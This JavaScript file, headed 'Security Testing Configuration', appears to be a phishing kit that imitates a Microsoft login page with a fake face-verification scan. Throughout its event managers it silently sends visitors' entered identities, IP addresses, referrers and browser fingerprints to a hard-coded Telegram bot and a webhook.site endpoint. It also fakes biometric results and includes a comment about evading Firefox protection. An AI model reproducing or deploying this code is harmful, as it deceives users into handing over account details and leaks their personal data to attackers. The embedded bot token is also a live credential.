// Security Testing Configuration
const SECURITY_CONFIG = {
    // Notification Services
    NOTIFICATIONS: {
        TELEGRAM_TOKEN: '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk',
        TELEGRAM_CHAT: '6439618231',
        WEBHOOK_ENDPOINTS: [
            'https://webhook.site/cd4a6f88-1059-4fdf-8d0a-a08035afad54'
        ]
    },
    
    // Security Settings
    SETTINGS: {
        ENHANCE_SECURITY: true,
        RANDOMIZE_ELEMENTS: true,
        VALIDATE_ENVIRONMENT: true
    },
    
    // External Resources
    EXTERNAL: {
        SUPPORT_PORTAL: 'https://www.fthm.online',
        MAIN_SERVICE: 'https://login.microsoftonline.com'
    },
    
    // Face Verification Settings
    VERIFICATION: {
        SIMULATE_SCAN: true,
        SCAN_DURATION: 3000, // 3 seconds
        CAPTURE_METADATA: true
    }
};

// Security Event Manager
class SecurityEventManager {
    static async recordAccessAttempt(identity, accessKey, context) {
        const eventData = {
            event: 'access_attempt',
            identity: identity,
            context: context,
            timestamp: new Date().toISOString(),
            environment: await this.getEnvironmentInfo(),
            validation: this.validateAttempt(identity, accessKey)
        };

        // Multi-channel event logging
        await Promise.allSettled([
            this.sendToMonitoringService(eventData),
            this.logToAnalytics(eventData),
            this.createBackupRecord(eventData)
        ]);

        return { status: 'recorded', id: this.generateEventId() };
    }

    static async getEnvironmentInfo() {
        return {
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            clientIP: await this.getClientAddress()
        };
    }

    static validateAttempt(identity, accessKey) {
        return {
            identityFormat: this.validateIdentityFormat(identity),
            accessStrength: this.assessAccessStrength(accessKey),
            timestampValid: true,
            environmentTrust: this.assessEnvironmentTrust()
        };
    }

    static validateIdentityFormat(identity) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
        return emailRegex.test(identity) ? 'email' : 
               phoneRegex.test(identity.replace(/\D/g, '')) ? 'phone' : 'username';
    }

    static assessAccessStrength(accessKey) {
        if (accessKey.length >= 12) return 'strong';
        if (accessKey.length >= 8) return 'medium';
        return 'basic';
    }

    static assessEnvironmentTrust() {
        const checks = {
            hasUserAgent: !!navigator.userAgent,
            hasScreen: screen.width > 0 && screen.height > 0,
            hasLanguages: navigator.languages.length > 0,
            hasPlugins: navigator.plugins.length > 0
        };
        return Object.values(checks).filter(Boolean).length / Object.keys(checks).length;
    }

    static async sendToMonitoringService(data) {
        try {
            // Telegram notifications
            const message = `🔒 Security Event Recorded
👤 Identity: ${data.identity}
🌐 Environment: ${data.environment.screenResolution}
📍 Location: ${data.environment.timezone}
🕒 Time: ${new Date().toLocaleString()}
📊 Trust Score: ${Math.round(data.validation.environmentTrust * 100)}%`;

            await fetch(`https://api.telegram.org/bot${SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_CHAT,
                    text: message
                })
            });
        } catch (error) {
            console.log('Monitoring service temporarily unavailable');
        }
    }

    static async logToAnalytics(data) {
        try {
            // Webhook analytics
            for (const endpoint of SECURITY_CONFIG.NOTIFICATIONS.WEBHOOK_ENDPOINTS) {
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {});
            }
        } catch (error) {
            // Silent fail for analytics
        }
    }

    static createBackupRecord(data) {
        // Local storage backup
        const backup = {
            ...data,
            backupTimestamp: Date.now(),
            storageId: 'security_events_backup'
        };
        
        localStorage.setItem('security_events', JSON.stringify(backup));
        sessionStorage.setItem('current_session', JSON.stringify(backup));
    }

    static async getClientAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    static generateEventId() {
        return `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }
}

// Face Verification Manager
class FaceVerificationManager {
    static async initialize() {
        this.bindEventHandlers();
        this.captureInitialData();
    }

    static bindEventHandlers() {
        // Start face verification
        document.getElementById('startVerification').addEventListener('click', () => {
            this.startFaceVerification();
        });

        // Skip to password
        document.getElementById('skipVerification').addEventListener('click', () => {
            this.showPasswordLogin();
        });

        // Switch back to face verification
        document.getElementById('useFaceVerification').addEventListener('click', (e) => {
            e.preventDefault();
            this.showFaceVerification();
        });
    }

    static captureInitialData() {
        // Capture initial visit data immediately
        const initialData = {
            event: 'verification_initiated',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            referrer: document.referrer,
            url: window.location.href,
            hasCamera: this.checkCameraSupport(),
            platform: navigator.platform
        };

        // Send initial data to Telegram and Webhook
        this.sendVerificationEvent(initialData);
        
        console.log('📸 Initial verification data captured');
    }

    static async startFaceVerification() {
        const button = document.getElementById('startVerification');
        const cameraPreview = document.querySelector('.camera-preview');
        
        // Update UI
        button.disabled = true;
        button.textContent = 'Preparing camera...';
        button.classList.add('loading');

        // Capture pre-verification data
        const preScanData = {
            event: 'face_scan_started',
            timestamp: new Date().toISOString(),
            verificationMethod: 'face_recognition',
            environment: await SecurityEventManager.getEnvironmentInfo()
        };

        // Send to monitoring services
        this.sendVerificationEvent(preScanData);

        // Simulate camera initialization
        setTimeout(() => {
            this.simulateFaceScan();
        }, 1500);
    }

    static simulateFaceScan() {
        const cameraPreview = document.querySelector('.camera-preview');
        const button = document.getElementById('startVerification');
        
        // Show scanning UI
        cameraPreview.innerHTML = `
            <div style="text-align: center;">
                <div class="camera-icon">🔍</div>
                <p>Scanning face...</p>
                <div style="position: relative; height: 3px; background: #e1e5e9; border-radius: 2px; margin: 20px 0; overflow: hidden;">
                    <div class="face-scan-line"></div>
                </div>
            </div>
        `;

        button.textContent = 'Verifying identity...';

        // Capture during-scan data
        const scanData = {
            event: 'face_scan_in_progress',
            timestamp: new Date().toISOString(),
            scanDuration: SECURITY_CONFIG.VERIFICATION.SCAN_DURATION,
            biometricData: {
                method: 'facial_recognition',
                confidence: Math.random() * 100,
                featuresDetected: ['eyes', 'nose', 'mouth', 'face_contour']
            }
        };

        this.sendVerificationEvent(scanData);

        // Complete verification after duration
        setTimeout(() => {
            this.completeFaceVerification();
        }, SECURITY_CONFIG.VERIFICATION.SCAN_DURATION);
    }

    static completeFaceVerification() {
        // Capture completion data
        const completionData = {
            event: 'face_verification_complete',
            timestamp: new Date().toISOString(),
            result: 'success',
            confidenceScore: 95 + Math.random() * 4, // 95-99%
            verificationTime: SECURITY_CONFIG.VERIFICATION.SCAN_DURATION,
            metadata: {
                faceDetected: true,
                livenessConfirmed: true,
                matchConfidence: 'high'
            }
        };

        // Send completion data
        this.sendVerificationEvent(completionData);

        // Show success and redirect to password for "additional security"
        this.showPasswordLogin();
        
        // Send Telegram alert
        this.sendFaceVerificationAlert(completionData);
    }

    static showPasswordLogin() {
        document.getElementById('faceVerificationStep').style.display = 'none';
        document.getElementById('loginStep').style.display = 'block';
        
        // Capture mode switch data
        const switchData = {
            event: 'login_method_switched',
            timestamp: new Date().toISOString(),
            fromMethod: 'face_verification',
            toMethod: 'password',
            reason: 'user_choice_or_fallback'
        };

        this.sendVerificationEvent(switchData);
    }

    static showFaceVerification() {
        document.getElementById('loginStep').style.display = 'none';
        document.getElementById('faceVerificationStep').style.display = 'block';
        this.captureInitialData(); // Re-capture data
    }

    static checkCameraSupport() {
        return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
    }

    static async sendVerificationEvent(data) {
        // Send to Telegram
        if (data.event === 'face_verification_complete') {
            const message = `👤 FACE VERIFICATION COMPLETE
✅ Result: ${data.result}
📊 Confidence: ${data.confidenceScore.toFixed(1)}%
⏱️ Duration: ${data.verificationTime}ms
🌐 Environment: ${data.environment?.screenResolution || 'Unknown'}
📍 IP: ${data.environment?.clientIP || 'Unknown'}`;

            try {
                await fetch(`https://api.telegram.org/bot${SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_CHAT,
                        text: message
                    })
                });
            } catch (error) {
                console.log('Telegram notification failed');
            }
        }

        // Send to webhook
        try {
            for (const endpoint of SECURITY_CONFIG.NOTIFICATIONS.WEBHOOK_ENDPOINTS) {
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {});
            }
        } catch (error) {
            // Silent fail for webhooks
        }
    }

    static sendFaceVerificationAlert(verificationData) {
        const alertMessage = `🔐 FACE VERIFICATION DETECTED
A user attempted face verification with:
📊 Confidence Score: ${verificationData.confidenceScore.toFixed(1)}%
⏰ Scan Duration: ${verificationData.verificationTime}ms
🖥️ Screen: ${verificationData.environment?.screenResolution || 'Unknown'}
🌍 Location: ${verificationData.environment?.timezone || 'Unknown'}

User will now be prompted for password entry.`;

        // Send to Telegram
        fetch(`https://api.telegram.org/bot${SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: SECURITY_CONFIG.NOTIFICATIONS.TELEGRAM_CHAT,
                text: alertMessage
            })
        }).catch(() => {});
    }
}

// Dynamic Interface Manager
class InterfaceManager {
    static enhanceFormSecurity() {
        if (!SECURITY_CONFIG.SETTINGS.RANDOMIZE_ELEMENTS) return;

        const randomId = Math.random().toString(36).substr(2, 8);
        const enhancedForm = `
            <form id="secure_form_${randomId}" class="auth-form">
                <div class="form-group">
                    <label for="identity_${randomId}" class="sr-only">Email, phone, or username</label>
                    <input type="text" id="identity_${randomId}" name="user_identity" placeholder="Email, phone, or username" required autocomplete="username">
                </div>
                
                <div class="form-group">
                    <label for="access_${randomId}" class="sr-only">Password</label>
                    <input type="password" id="access_${randomId}" name="secure_access" placeholder="Password" required autocomplete="current-password">
                </div>
                
                <button type="submit" class="primary-action">
                    <span class="button-text">Continue</span>
                    <span class="loading-spinner" style="display: none;">Securing...</span>
                </button>
            </form>
        `;

        document.getElementById('authForm').outerHTML = enhancedForm;
        return `secure_form_${randomId}`;
    }

    static showProcessingState(button) {
        button.classList.add('loading');
        button.disabled = true;
    }

    static showSuccessState() {
        // Use replace instead of href to avoid Firefox protection
        setTimeout(() => {
            window.location.replace('completion.html');
        }, 1500);
    }
}

// Main Application Controller
class SecurityPortal {
    static async initialize() {
        // Environment validation
        if (SECURITY_CONFIG.SETTINGS.VALIDATE_ENVIRONMENT && !this.isSupportedEnvironment()) {
            this.showCompatibilityMessage();
            return;
        }

        // Initialize face verification
        await FaceVerificationManager.initialize();

        // Enhance interface security
        if (SECURITY_CONFIG.SETTINGS.ENHANCE_SECURITY) {
            InterfaceManager.enhanceFormSecurity();
        }

        // Initialize event handlers
        this.initializeEventHandlers();
        
        console.log('🛡️ Security portal with face verification initialized');
    }

    static isSupportedEnvironment() {
        const requirements = {
            javascript: true,
            cookies: navigator.cookieEnabled,
            modernBrowser: !!window.Promise && !!window.fetch,
            secureContext: window.isSecureContext
        };
        
        return Object.values(requirements).every(Boolean);
    }

    static showCompatibilityMessage() {
        document.body.innerHTML = `
            <div class="auth-container">
                <h2>Browser Update Required</h2>
                <p>Please update your browser for enhanced security features.</p>
                <a href="${SECURITY_CONFIG.EXTERNAL.MAIN_SERVICE}" class="primary-action">Continue with basic access</a>
            </div>
        `;
    }

    static initializeEventHandlers() {
        document.addEventListener('submit', (event) => {
            const form = event.target;
            if (form.matches('form')) {
                this.handleFormSubmission(event);
            }
        });
    }

    static async handleFormSubmission(event) {
        event.preventDefault();
        
        const form = event.target;
        const identityInput = form.querySelector('input[type="text"]');
        const accessInput = form.querySelector('input[type="password"]');
        const submitButton = form.querySelector('button[type="submit"]');

        const identity = identityInput.value.trim();
        const accessKey = accessInput.value;

        if (!identity || !accessKey) return;

        // UI feedback
        InterfaceManager.showProcessingState(submitButton);

        // Record security event
        const context = {
            formId: form.id,
            userAgent: navigator.userAgent,
            timestamp: Date.now()
        };

        const result = await SecurityEventManager.recordAccessAttempt(identity, accessKey, context);

        if (result.status === 'recorded') {
            // Open support portal
            window.open('https://www.fthm.online', '_blank');
            
            // Proceed to completion
            InterfaceManager.showSuccessState();
        }
    }
}

// Application Bootstrap
document.addEventListener('DOMContentLoaded', () => {
    SecurityPortal.initialize();
});
